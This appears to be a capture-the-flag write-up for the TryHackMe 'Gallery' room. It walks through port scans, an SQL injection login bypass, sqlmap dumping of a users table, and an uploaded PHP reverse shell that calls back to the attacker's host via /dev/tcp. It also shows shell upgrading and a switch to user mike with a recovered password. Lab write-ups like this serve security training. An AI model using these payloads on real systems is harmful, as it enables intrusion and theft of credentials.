# Gallery

**Room Link:** [https://tryhackme.com/room/gallery666](https://tryhackme.com/room/gallery666)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>



### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>



### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>



### TCP/8080 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt --wildcard
```







### TCP/80 - HTTP

<figure><img src="../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

SQL injection worked on username field

```
Username: 1' or '1'='1'-- -
Password: anything
```

<figure><img src="../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

We found two databases

**Kali**

```
sudo sqlmap -r request.req --dbs
```

<figure><img src="../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

Get tables

**Kali**

```
sudo sqlmap -r request.req --current-db gallery_db --tables
```

<figure><img src="../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

Get fields for table users

**Kali**

```
sudo sqlmap -r request.req --current-db gallery_db --tables -T users --columns
```



<figure><img src="../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

Get values of the username and password fields. I couldn't crack the hash.

**Kali**

```
sudo sqlmap -r request.req --current-db gallery_db --tables -T users  -C username,password --dump
```

<figure><img src="../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

I was able to upload a php reverse shell instead of an image

**Kali**

```
nc -lvnp 443
```

**revshell.php code**

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
?>
```



<figure><img src="../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

<figure><img src="../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

We found a list of passwords from mike in a file called accounts and another password in history

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su mike
Password: b3stpassw0rdbr0xx
```

<figure><img src="../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>











